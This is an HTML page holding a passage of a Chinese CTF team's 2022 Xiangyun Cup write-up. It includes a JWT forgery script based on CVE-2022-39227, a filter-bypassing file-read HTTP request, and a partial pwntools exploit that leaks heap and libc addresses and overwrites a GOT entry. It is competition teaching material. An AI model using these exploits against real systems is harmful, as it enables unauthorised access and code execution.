<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2022 祥云杯 SU Writeup -</title><meta name=description content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/xyb-2022-su-wu\/","name":"2022 祥云杯 su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2022 祥云杯 SU Writeup","description":"以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！ 同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)\n","inLanguage":"en","wordCount":3138,"datePublished":"2022-10-31T07:43:42\u002b00:00","dateModified":"2022-10-31T07:43:42\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["祥云杯"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/xyb-2022-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2022 祥云杯 SU Writeup"><meta property="og:description" content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/xyb-2022-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2022 祥云杯 SU Writeup"><meta name=twitter:description content="以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href=https://su-team.cn/css/codeblock.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2022 祥云杯 SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on October 31, 311042
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;15&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;3138&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#funweb>FunWEB</a></li><li><a href=#ezjava>ezjava</a></li><li><a href=#rustwaf>Rustwaf</a></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#ojs>ojs</a></li><li><a href=#protocol>protocol</a></li><li><a href=#queue>queue</a></li><li><a href=#unexploitable>unexploitable</a></li><li><a href=#sandboxheap>sandboxheap</a></li><li><a href=#bitheap>bitheap</a></li><li><a href=#leak>leak</a></li></ul></li><li><a href=#misc>Misc</a><ul><li><a href=#strange_forensics>strange_forensics</a></li></ul></li><li><a href=#rev>Rev</a><ul><li><a href=#roket>roket</a></li></ul></li><li><a href=#crypto>crypto</a><ul><li><a href=#little-little-fermat>little little fermat</a></li><li><a href=#tracing>tracing</a></li><li><a href=#fill>fill</a></li><li><a href=#babydlp>babyDLP</a></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p><hr><p>以下是我们 SU 本次2022 祥云杯 的 writeup ，感谢队里师傅们的辛苦付出！
同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)</p><h1 id=web>Web</h1><h2 id=funweb>FunWEB</h2><p>注册一个账号，然后登录，发现是jwt，参考cve-2022-39227，拿官方exp构造越权
<a href=https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py>https://github.com/davedoesdev/python-jwt/blob/88ad9e67c53aa5f7c43ec4aa52ed34b7930068c9/test/vulnerability_vows.py</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>datetime</span> <span class=kn>import</span> <span class=n>timedelta</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>loads</span><span class=p>,</span> <span class=n>dumps</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>python_jwt</span> <span class=k>as</span> <span class=nn>jwt</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>jwcrypto.common</span> <span class=kn>import</span> <span class=n>base64url_decode</span><span class=p>,</span> <span class=n>base64url_encode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>topic</span> <span class=o>=</span> <span class=s2>&#34;ddd&#34;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>header</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=n>signature</span><span class=p>]</span> <span class=o>=</span> <span class=n>topic</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>parsed_payload</span> <span class=o>=</span> <span class=n>loads</span><span class=p>(</span><span class=n>base64url_decode</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>parsed_payload</span><span class=p>[</span><span class=s1>&#39;is_admin&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>parsed_payload</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span>
</span></span><span class=line><span class=cl><span class=n>parsed_payload</span><span class=p>[</span><span class=s1>&#39;exp&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>2000000000</span>
</span></span><span class=line><span class=cl><span class=n>fake_payload</span> <span class=o>=</span> <span class=n>base64url_encode</span><span class=p>((</span><span class=n>dumps</span><span class=p>(</span><span class=n>parsed_payload</span><span class=p>,</span> <span class=n>separators</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>))))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s1>&#39;{&#34;  &#39;</span> <span class=o>+</span> <span class=n>header</span> <span class=o>+</span> <span class=s1>&#39;.&#39;</span> <span class=o>+</span> <span class=n>fake_payload</span> <span class=o>+</span> <span class=s1>&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>header</span> <span class=o>+</span> <span class=s1>&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=s1>&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>signature</span> <span class=o>+</span> <span class=s1>&#39;&#34;}&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2022-xyb-SU-Writeup/1.png alt=img>
生成后就可以开始使用graphql注入，一步步注入获取密码为13Rj2x7VgjCLHIOZSGX0
<img src=/img/2022-xyb-SU-Writeup/2.png alt=img>
登录后查看flag</p><h2 id=ezjava>ezjava</h2><p><img src=/img/2022-xyb-SU-Writeup/3.png alt=img>
cc4可以直接打，但是不出网，所以得打一个tomcat通用回显
<img src=/img/2022-xyb-SU-Writeup/4.png alt=img></p><h2 id=rustwaf>Rustwaf</h2><p>先读src，然后使用/readfile 传入/flag可以进一步看到源码
<img src=/img/2022-xyb-SU-Writeup/5.png alt=img>
参考https://blog.maple3142.net/2022/08/07/corctf-2022-writeups/#rustshop</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>POST</span> <span class=o>/</span><span class=n>readfile</span> <span class=n>HTTP</span><span class=o>/</span><span class=mf>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=p>:</span> <span class=n>eci</span><span class=o>-</span><span class=mi>2</span><span class=n>zef45s04koksnpurlze</span><span class=o>.</span><span class=n>cloudeci1</span><span class=o>.</span><span class=n>ichunqiu</span><span class=o>.</span><span class=n>com</span><span class=p>:</span><span class=mi>3000</span>
</span></span><span class=line><span class=cl><span class=n>User</span><span class=o>-</span><span class=n>Agent</span><span class=p>:</span> <span class=n>Mozilla</span><span class=o>/</span><span class=mf>5.0</span> <span class=p>(</span><span class=n>Macintosh</span><span class=p>;</span> <span class=n>Intel</span> <span class=n>Mac</span> <span class=n>OS</span> <span class=n>X</span> <span class=mf>10.15</span><span class=p>;</span> <span class=n>rv</span><span class=p>:</span><span class=mf>106.0</span><span class=p>)</span> <span class=n>Gecko</span><span class=o>/</span><span class=mi>20100101</span> <span class=n>Firefox</span><span class=o>/</span><span class=mf>106.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=p>:</span> <span class=o>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Language</span><span class=p>:</span> <span class=n>zh</span><span class=o>-</span><span class=n>CN</span><span class=p>,</span><span class=n>zh</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.8</span><span class=p>,</span><span class=n>zh</span><span class=o>-</span><span class=n>TW</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.7</span><span class=p>,</span><span class=n>zh</span><span class=o>-</span><span class=n>HK</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.5</span><span class=p>,</span><span class=n>en</span><span class=o>-</span><span class=n>US</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.3</span><span class=p>,</span><span class=n>en</span><span class=p>;</span><span class=n>q</span><span class=o>=</span><span class=mf>0.2</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>gzip</span><span class=p>,</span> <span class=n>deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>application</span><span class=o>/</span><span class=n>x</span><span class=o>-</span><span class=n>www</span><span class=o>-</span><span class=n>form</span><span class=o>-</span><span class=n>urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Cache</span><span class=p>:</span> <span class=n>no</span><span class=o>-</span><span class=n>cache</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Length</span><span class=p>:</span> <span class=mi>36</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=p>:</span> <span class=n>moz</span><span class=o>-</span><span class=n>extension</span><span class=p>:</span><span class=o>//</span><span class=mi>74</span><span class=n>b5b769</span><span class=o>-</span><span class=n>a8c6</span><span class=o>-</span><span class=mi>3</span><span class=n>b45</span><span class=o>-</span><span class=n>af82</span><span class=o>-</span><span class=mi>1453</span><span class=n>eac308dd</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=p>:</span> <span class=n>close</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=s2>&#34;file:&#34;</span><span class=p>,</span><span class=s2>&#34;b&#34;</span><span class=p>,</span><span class=s2>&#34;a&#34;</span><span class=p>,</span><span class=s2>&#34;/</span><span class=si>%66%</span><span class=s2>6c</span><span class=si>%61%</span><span class=s2>67&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>]</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=pwn>pwn</h1><h2 id=ojs>ojs</h2><p>查找关键词可知，这题魔改自项目：https://github.com/ndreynolds/flathead
比对源码可知，新增了方法<code>charTo</code>
逆一下，<code>str.charTo(offset, val)</code>代表将字符串<code>str</code>偏移<code>offset</code>（可正可负）处改为<code>val</code>。</p><p>可越界写的条件是字符串<code>str</code>的长度为<code>3</code>，且当<code>val = 17</code>的时候，会返回存放<code>str</code>自身的堆块地址（结合动态调试）。</p><p><img src=/img/2022-xyb-SU-Writeup/10.png alt=image></p><p>由于本题没开<code>PIE</code>保护，且<code>got</code>表可写：</p><p><img src=/img/2022-xyb-SU-Writeup/11.png alt=image></p><p>所以其实任意写的思路很显然：先泄露出<code>str</code>自身堆块地址，然后就能用其与某<code>got</code>表地址的差值通过<code>charTo</code>任意写<code>got</code>表了。</p><p>泄露<code>libc</code>的思路也不难想到，可以将初始长度为<code>3</code>的<code>str</code>后面的<code>\x00</code>不断覆盖掉，这样就能泄露后面内存中的<code>libc</code>地址了，这里其实也可以泄露出堆块地址。</p><p>不过，由于比赛的时候远程环境十分诡异，导致当时配了几个小时环境都没弄出来远程的环境（打通以后才知道原因应该是由于共享库被放在了题目的同一目录下QAQ），后来就干脆采用了无脑爆破的做法。<code>str</code>后面内存区域中<code>libc</code>的位置需要爆破一下，得到是<code>60*8</code>的偏移处，然后得到了<code>libc</code>地址以后，其相对于基地址的偏移也需要爆破一下（这里其实有个技巧，就比如我这里劫持的是<code>printf</code>的<code>got</code>表，那么可能出问题也就是倒数第二、三个字节，先只改倒数第二个字节，其余保持原先的值不变，如果最后能正常输出，则表示倒数第四位的偏移爆破正确了，倒数第三个字节的爆破也同理这么操作）。</p><p>此外，这里应该也可以通过改某个<code>got</code>表为<code>puts@plt</code>，然后输入某个<code>got</code>的地址来泄露<code>libc</code>，或者先劫持<code>bss</code>段上的<code>stdin/stdout/stderr</code>指针为某个<code>got</code>表地址，然后比如再改<code>setvbuf</code>的<code>got</code>表为<code>puts@plt</code>，最后劫持执行流到<code>setvbuf</code>来泄露。不过这里貌似不太好泄露完再返回了，但是通过这里泄露的值和上述<code>60*8</code>的位置泄露的<code>libc</code>比对一下就不需要上面的爆破操作了。</p><p>最后，选用如下<code>one_gadget</code>即可：
<img src=/img/2022-xyb-SU-Writeup/12.png alt=image></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span> <span class=o>=</span> <span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;39.106.13.71&#34;</span><span class=p>,</span> <span class=mi>38641</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./ojs&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;a = &#34;win&#34;;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;x = a.charTo(0, 17);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;console.log(&#34;xxx&#34; + x.toString() + &#34;xxx&#34;);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;xxx&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_addr</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;xxx&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;xxx&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;heap_addr:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>heap_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;for(var i = 3; i &lt; 60*8; i++) a.charTo(i, 97);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>,</span> <span class=s1>&#39;console.log(a);&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\x7f</span><span class=s2>&#34;</span><span class=p>)[</span><span class=o>-</span><span class=mi>6</span><span class=p>:]</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_addr:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>libc_base</span> <span class=o>=</span> <span class=n>libc_addr</span> <span class=o>-</span> <span class=mh>0xd22ce8</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;libc_base:</span><span class=se>\t</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>libc_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>dis</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=n>heap_addr</span>
</span></span><span class=line><span class=cl><span class=n>og</span> <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0xe54f7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>)</span> <span class=p>:</span>
